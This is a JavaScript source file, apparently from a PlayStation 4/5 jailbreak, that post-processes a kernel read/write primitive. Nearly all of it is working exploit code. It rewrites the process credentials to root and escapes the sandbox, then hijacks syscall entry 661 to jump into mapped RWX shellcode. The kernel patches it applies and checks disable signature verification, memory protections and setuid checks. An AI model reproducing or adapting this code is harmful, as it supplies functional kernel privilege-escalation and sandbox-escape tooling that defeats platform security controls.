  kernel_offset.IP6PO_TCLASS = 0xB0    // PS4 = 0xB0, PS5 = 0xC0
  kernel_offset.IP6PO_RTHDR = 0x68     // PS4 = 0x68, PS5 = 0x70

  return kernel_offset
}

// Global kernel object to save information
// Also used in lapse.js

kernel = {
  // Object used to sture kbase, curproc, allproc
  addr: {},
  // We need to define these 2 functions in the exploit
  read_buffer: null,
  write_buffer: null
}

// Helper functions
function is_kernel_rw_available () {
  return kernel.read_buffer && kernel.write_buffer
}

function check_kernel_rw () {
  if (!is_kernel_rw_available()) {
    throw new Error('kernel r/w is not available')
  }
}

kernel.read_byte = function (kaddr) {
  const value = kernel.read_buffer(kaddr, 1)
  return value && value.length === 1 ? (value[0]) : null
}

kernel.read_word = function (kaddr) {
  const value = kernel.read_buffer(kaddr, 2)
  if (!value || value.length !== 2) return null
  return (value[0]) | ((value[1]) << 8)
}

kernel.read_dword = function (kaddr) {
  const value = kernel.read_buffer(kaddr, 4)
  if (!value || value.length !== 4) return null
  var result = 0
  for (var i = 0; i < 4; i++) {
    result |= ((value[i]) << (i * 8))
  }
  return result
}

kernel.read_qword = function (kaddr) {
  const value = kernel.read_buffer(kaddr, 8)
  if (!value || value.length !== 8) return null
  var result_hi = 0
  var result_low = 0
  for (var i = 0; i < 4; i++) {
    result_hi |= ((value[i + 4]) << (i * 8))
    result_low |= ((value[i]) << (i * 8))
  }
  var result = new BigInt(result_hi, result_low)
  return result
}

kernel.read_null_terminated_string = function (kaddr) {
  var result = ''

  while (true) {
    const chunk = kernel.read_buffer(kaddr, 0x8)
    if (!chunk || chunk.length === 0) break

    var null_pos = -1
    for (var i = 0; i < chunk.length; i++) {
      if (chunk[i] === 0) {
        null_pos = i
        break
      }
    }

    if (null_pos >= 0) {
      if (null_pos > 0) {
        for (var i = 0; i < null_pos; i++) {
          result += String.fromCharCode(Number(chunk[i]))
        }
      }
      return result
    }

    for (var i = 0; i < chunk.length; i++) {
      result += String.fromCharCode(Number(chunk[i]))
    }

    kaddr = kaddr.add(chunk.length)
  }

  return result
}

kernel.write_byte = function (dest, value) {
  const buf = new Uint8Array(1)
  buf[0] = Number(value & 0xFF)
  kernel.write_buffer(dest, buf)
}

kernel.write_word = function (dest, value) {
  const buf = new Uint8Array(2)
  buf[0] = Number(value & 0xFF)
  buf[1] = Number((value >> 8) & 0xFF)
  kernel.write_buffer(dest, buf)
}

kernel.write_dword = function (dest, value) {
  const buf = new Uint8Array(4)
  for (var i = 0; i < 4; i++) {
    buf[i] = Number((value >> (i * 8)) & 0xFF)
  }
  kernel.write_buffer(dest, buf)
}

kernel.write_qword = function (dest, value) {
  const buf = new Uint8Array(8)
  value = value instanceof BigInt ? value : new BigInt(value)

  var val_hi = value.hi
  var val_low = value.lo

  for (var i = 0; i < 4; i++) {
    buf[i] = Number((val_low >> (i * 8))) & 0xFF
    buf[i + 4] = Number((val_hi >> ((i + 4) * 8))) & 0xFF
  }
  kernel.write_buffer(dest, buf)
}

function sysctlbyname (name, oldp, oldp_len, newp, newp_len) {
  const translate_name_mib = malloc(0x8)
  const buf_size = 0x70
  const mib = malloc(buf_size)
  const size = malloc(0x8)

  write64(translate_name_mib, new BigInt(0x3, 0x0))
  write64(size, buf_size)

  const name_addr = utils.cstr(name)
  const name_len = new BigInt(name.length)

  if (sysctl(translate_name_mib, 2, mib, size, name_addr, name_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
    log('failed to translate sysctl name to mib (' + name + ')')
  }

  if (sysctl(mib, 2, oldp, oldp_len, newp, newp_len).eq(new BigInt(0xffffffff, 0xffffffff))) {
    return false
  }

  return true
}

function get_fwversion () {
  const buf = malloc(0x8)
  const size = malloc(0x8)
  write64(size, 0x8)
  if (sysctlbyname('kern.sdk_version', buf, size, 0, 0)) {
    const byte1 = Number(read8(buf.add(2)))  // Minor version (first byte)
    const byte2 = Number(read8(buf.add(3)))  // Major version (second byte)

    const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0')
    return version
  }

  return null
}

// Before calling this function we need to initialize
//      kernel.addr.curproc
//      kernel.addr.allproc
//      kernel.addr.base

function jailbreak_shared (FW_VERSION) {
  const OFFSET_P_UCRED = 0x40
  const proc = kernel.addr.curproc

  const uid_before = Number(getuid())
  const sandbox_before = Number(is_in_sandbox())
  debug('BEFORE: uid=' + uid_before + ', sandbox=' + sandbox_before)

  // Patch ucred
  const proc_fd = kernel.read_qword(proc.add(kernel_offset.PROC_FD))
  const ucred = kernel.read_qword(proc.add(OFFSET_P_UCRED))

  kernel.write_dword(ucred.add(0x04), 0)  // cr_uid
  kernel.write_dword(ucred.add(0x08), 0)  // cr_ruid
  kernel.write_dword(ucred.add(0x0C), 0)  // cr_svuid
  kernel.write_dword(ucred.add(0x10), 1)  // cr_ngroups
  kernel.write_dword(ucred.add(0x14), 0)  // cr_rgid

  const prison0 = kernel.read_qword(kernel.addr.base.add(kernel_offset.PRISON0))
  kernel.write_qword(ucred.add(0x30), prison0)

  kernel.write_qword(ucred.add(0x60), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))  // sceCaps
  kernel.write_qword(ucred.add(0x68), new BigInt(0xFFFFFFFF, 0xFFFFFFFF))

  const rootvnode = kernel.read_qword(kernel.addr.base.add(kernel_offset.ROOTVNODE))
  kernel.write_qword(proc_fd.add(0x10), rootvnode)  // fd_rdir
  kernel.write_qword(proc_fd.add(0x18), rootvnode)  // fd_jdir

  const uid_after = Number(getuid())
  const sandbox_after = Number(is_in_sandbox())
  debug('AFTER:  uid=' + uid_after + ', sandbox=' + sandbox_after)

  if (uid_after === 0 && sandbox_after === 0) {
    debug('Sandbox escape complete!')
  } else {
    debug('[WARNING] Sandbox escape may have failed')
  }

  // === Apply kernel patches via kexec ===
  // Uses syscall_raw() which sets rax manually for syscalls without gadgets
  debug('Applying kernel patches...')
  const kpatch_result = apply_kernel_patches(FW_VERSION)
  if (kpatch_result) {
    debug('Kernel patches applied successfully!')

    // Comprehensive kernel patch verification
    debug('Verifying kernel patches...')
    var all_patches_ok = true

    // 1. Verify mmap RWX patch (0x33 -> 0x37 at two locations)
    const mmap_offsets = get_mmap_patch_offsets(FW_VERSION)
    if (mmap_offsets) {
      const b1 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[0]))
      const b2 = kernel.read_byte(kernel.addr.base.add(mmap_offsets[1]))
      const byte1 = b1 instanceof BigInt ? Number(b1.and(0xff)) : b1
      const byte2 = b2 instanceof BigInt ? Number(b2.and(0xff)) : b2
      if (byte1 === 0x37 && byte2 === 0x37) {
        debug('  [OK] mmap RWX patch')
      } else {
        debug('  [FAIL] mmap RWX: [' + hex(mmap_offsets[0]) + ']=' + hex(byte1) + ' [' + hex(mmap_offsets[1]) + ']=' + hex(byte2))
        all_patches_ok = false
      }
    } else {
      debug('  [SKIP] mmap RWX (no offsets for FW ' + FW_VERSION + ')')
    }

    // 2. Test mmap RWX actually works by trying to allocate RWX memory
    try {
      const PROT_RWX = 0x7  // READ | WRITE | EXEC
      const MAP_ANON = 0x1000
      const MAP_PRIVATE = 0x2
      const test_addr = mmap(0, 0x1000, PROT_RWX, MAP_PRIVATE | MAP_ANON, new BigInt(0xFFFFFFFF, 0xFFFFFFFF), 0)
      if (Number(test_addr.shr(32)) < 0xffff8000) {
        debug('  [OK] mmap RWX functional @ ' + hex(test_addr))
        // Unmap the test allocation
        munmap(test_addr, 0x1000)
      } else {
        debug('  [FAIL] mmap RWX functional: ' + hex(test_addr))
        all_patches_ok = false
      }
    } catch (e) {
      debug('  [FAIL] mmap RWX test error: ' + e.message)
      all_patches_ok = false
    }

    if (all_patches_ok) {
      debug('All kernel patches verified OK!')
    } else {
      debug('[WARNING] Some kernel patches may have failed')
    }
  } else {
    debug('[WARNING] Kernel patches failed - continuing without patches')
  }
}

// Apply kernel patches via kexec using a single ROP chain
// This avoids returning to JS between critical operations
function apply_kernel_patches (fw_version) {
  try {
    // Get shellcode for this firmware
    const shellcode = get_kpatch_shellcode(fw_version)
    if (!shellcode) {
      debug('No kernel patch shellcode for FW ' + fw_version)
      return false
    }

    debug('Kernel patch shellcode: ' + shellcode.length + ' bytes')

    // Constants
    const PROT_READ = 0x1
    const PROT_WRITE = 0x2
    const PROT_EXEC = 0x4
    const PROT_RWX = PROT_READ | PROT_WRITE | PROT_EXEC

    const mapping_addr = new BigInt(0x9, 0x26100000)  // Different from 0x920100000 to avoid conflicts
    const aligned_memsz = 0x10000

    // Get sysent[661] address and save original values
    const sysent_661_addr = kernel.addr.base.add(kernel_offset.SYSENT_661)
    debug('sysent[661] @ ' + hex(sysent_661_addr))

    const sy_narg = kernel.read_dword(sysent_661_addr)
    const sy_call = kernel.read_qword(sysent_661_addr.add(8))
    const sy_thrcnt = kernel.read_dword(sysent_661_addr.add(0x2C))

    debug('Original sy_narg: ' + hex(sy_narg))
    debug('Original sy_call: ' + hex(sy_call))
    debug('Original sy_thrcnt: ' + hex(sy_thrcnt))

    // Calculate jmp rsi gadget address
    const jmp_rsi_gadget = kernel.addr.base.add(kernel_offset.JMP_RSI_GADGET)
    debug('jmp rsi gadget @ ' + hex(jmp_rsi_gadget))

    // Allocate buffer for shellcode in userspace first
    const shellcode_buf = malloc(shellcode.length + 0x100)
    debug('Shellcode buffer @ ' + hex(shellcode_buf))

    // Copy shellcode to userspace buffer
    for (var i = 0; i < shellcode.length; i++) {
      write8(shellcode_buf.add(i), shellcode[i])
    }

    // Verify first bytes
    const first_bytes = read32(shellcode_buf)
    debug('First bytes @ shellcode: ' + hex(first_bytes))

    // Hijack sysent[661] to point to jmp rsi gadget
    debug('Hijacking sysent[661]...')
    kernel.write_dword(sysent_661_addr, 2)                      // sy_narg = 2
    kernel.write_qword(sysent_661_addr.add(8), jmp_rsi_gadget)  // sy_call = jmp rsi
    kernel.write_dword(sysent_661_addr.add(0x2C), 1)            // sy_thrcnt = 1
    debug('Hijacked sysent[661]')

    // Check if jitshm_create has a dedicated gadget
    const jitshm_num = 0x215 // SYSCALL.jitshm_create = 0x215n;     // 533
    const jitshm_gadget = syscalls.map.get(jitshm_num)
    debug('jitshm_create gadget: ' + (jitshm_gadget ? hex(jitshm_gadget) : 'NOT FOUND'))

    // Try using the standard syscall() function if gadget exists
    if (!jitshm_gadget) {
      debug('ERROR: jitshm_create gadget not found in libkernel')
      debug('Kernel patches require jitshm_create syscall support')
      return false
    }

    // 1. jitshm_create(0, aligned_memsz, PROT_RWX)
    debug('Calling jitshm_create...')

    const exec_handle = jitshm_create(0, aligned_memsz, PROT_RWX)
    debug('jitshm_create handle: ' + hex(exec_handle))

    if (Number(exec_handle.shr(32)) >= 0xffff8000) {
      debug('ERROR: jitshm_create failed')
      kernel.write_dword(sysent_661_addr, sy_narg)
      kernel.write_qword(sysent_661_addr.add(8), sy_call)
      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
      return false
    }

    // 2. mmap(mapping_addr, aligned_memsz, PROT_RWX, MAP_SHARED|MAP_FIXED, exec_handle, 0)
    debug('Calling mmap...')

    const mmap_result = mmap(mapping_addr, aligned_memsz, PROT_RWX, 0x11, exec_handle, 0)
    debug('mmap result: ' + hex(mmap_result))

    if (Number(mmap_result.shr(32)) >= 0xffff8000) {
      debug('ERROR: mmap failed')
      kernel.write_dword(sysent_661_addr, sy_narg)
      kernel.write_qword(sysent_661_addr.add(8), sy_call)
      kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
      return false
    }

    // 3. Copy shellcode to mapped memory
    debug('Copying shellcode to ' + hex(mapping_addr) + '...')
    for (var j = 0; j < shellcode.length; j++) {
      write8(mapping_addr.add(j), shellcode[j])
    }

    // Verify
    const verify_bytes = read32(mapping_addr)
    debug('First bytes @ mapped: ' + hex(verify_bytes))

    // 4. kexec(mapping_addr) - syscall 661, hijacked to jmp rsi
    debug('Calling kexec...')

    const kexec_result = kexec(mapping_addr)
    debug('kexec returned: ' + hex(kexec_result))

    // === Verify 12.00 kernel patches ===
    if (fw_version === '12.00' || fw_version === '12.02') {
      debug('Verifying 12.00 kernel patches...')
      var patch_errors = 0

      // Patch offsets and expected values for 12.00
      const patches_to_verify = [
        { off: 0x1b76a3, exp: 0x04eb, name: 'dlsym_check1', size: 2 },
        { off: 0x1b76b3, exp: 0x04eb, name: 'dlsym_check2', size: 2 },
        { off: 0x1b76d3, exp: 0xe990, name: 'dlsym_check3', size: 2 },
        { off: 0x627af4, exp: 0x00eb, name: 'veriPatch', size: 2 },
        { off: 0xacd, exp: 0xeb, name: 'bcopy', size: 1 },
        { off: 0x2bd3cd, exp: 0xeb, name: 'bzero', size: 1 },
        { off: 0x2bd411, exp: 0xeb, name: 'pagezero', size: 1 },
        { off: 0x2bd48d, exp: 0xeb, name: 'memcpy', size: 1 },
        { off: 0x2bd4d1, exp: 0xeb, name: 'pagecopy', size: 1 },
        { off: 0x2bd67d, exp: 0xeb, name: 'copyin', size: 1 },
        { off: 0x2bdb2d, exp: 0xeb, name: 'copyinstr', size: 1 },
        { off: 0x2bdbfd, exp: 0xeb, name: 'copystr', size: 1 },
        { off: 0x6283df, exp: 0x00eb, name: 'sysVeri_suspend', size: 2 },
        { off: 0x490, exp: 0x00, name: 'syscall_check', size: 4 },
        { off: 0x4c2, exp: 0xeb, name: 'syscall_jmp1', size: 1 },
        { off: 0x4b9, exp: 0x00eb, name: 'syscall_jmp2', size: 2 },
        { off: 0x4b5, exp: 0x00eb, name: 'syscall_jmp3', size: 2 },
        { off: 0x3914e6, exp: 0xeb, name: 'setuid', size: 1 },
        { off: 0x2fc0ec, exp: 0x04eb, name: 'vm_map_protect', size: 2 },
        { off: 0x1b7164, exp: 0xe990, name: 'dynlib_load_prx', size: 2 },
        { off: 0x1fa71a, exp: 0x37, name: 'mmap_rwx1', size: 1 },
        { off: 0x1fa71d, exp: 0x37, name: 'mmap_rwx2', size: 1 },
        { off: 0x1102d80, exp: 0x02, name: 'sysent11_narg', size: 4 },
        { off: 0x1102dac, exp: 0x01, name: 'sysent11_thrcnt', size: 4 },
      ]

      for (p of patches_to_verify) {
        var actual
        if (p.size === 1) {
          actual = Number(kernel.read_byte(kernel.addr.base.add(p.off)))
        } else if (p.size === 2) {
          actual = Number(kernel.read_word(kernel.addr.base.add(p.off)))
        } else {
          actual = Number(kernel.read_dword(kernel.addr.base.add(p.off)))
        }

        if (actual === p.exp) {
          debug('  [OK] ' + p.name)
        } else {
          debug('  [FAIL] ' + p.name + ': expected ' + hex(p.exp) + ', got ' + hex(actual))
          patch_errors++
        }
      }

      // Special check for sysent[11] sy_call - should point to jmp [rsi] gadget
      const sysent11_call = kernel.read_qword(kernel.addr.base.add(0x1102d88))
      const expected_gadget = kernel.addr.base.add(0x47b31)
      if (sysent11_call.eq(expected_gadget)) {
        debug('  [OK] sysent11_call -> jmp_rsi @ ' + hex(sysent11_call))
      } else {
        debug('  [FAIL] sysent11_call: expected ' + hex(expected_gadget) + ', got ' + hex(sysent11_call))
        patch_errors++
      }

      if (patch_errors === 0) {
        debug('All 12.00 kernel patches verified OK!')
      } else {
        debug('[WARNING] ' + patch_errors + ' kernel patches failed!')
      }
    }

    // Restore original sysent[661]
    debug('Restoring sysent[661]...')
    kernel.write_dword(sysent_661_addr, sy_narg)
    kernel.write_qword(sysent_661_addr.add(8), sy_call)
    kernel.write_dword(sysent_661_addr.add(0x2C), sy_thrcnt)
    debug('Restored sysent[661]')

    debug('Kernel patches applied!')

    return true
  } catch (e) {
    debug('apply_kernel_patches error: ' + e.message)
    debug(e.stack)
    return false
  }
}
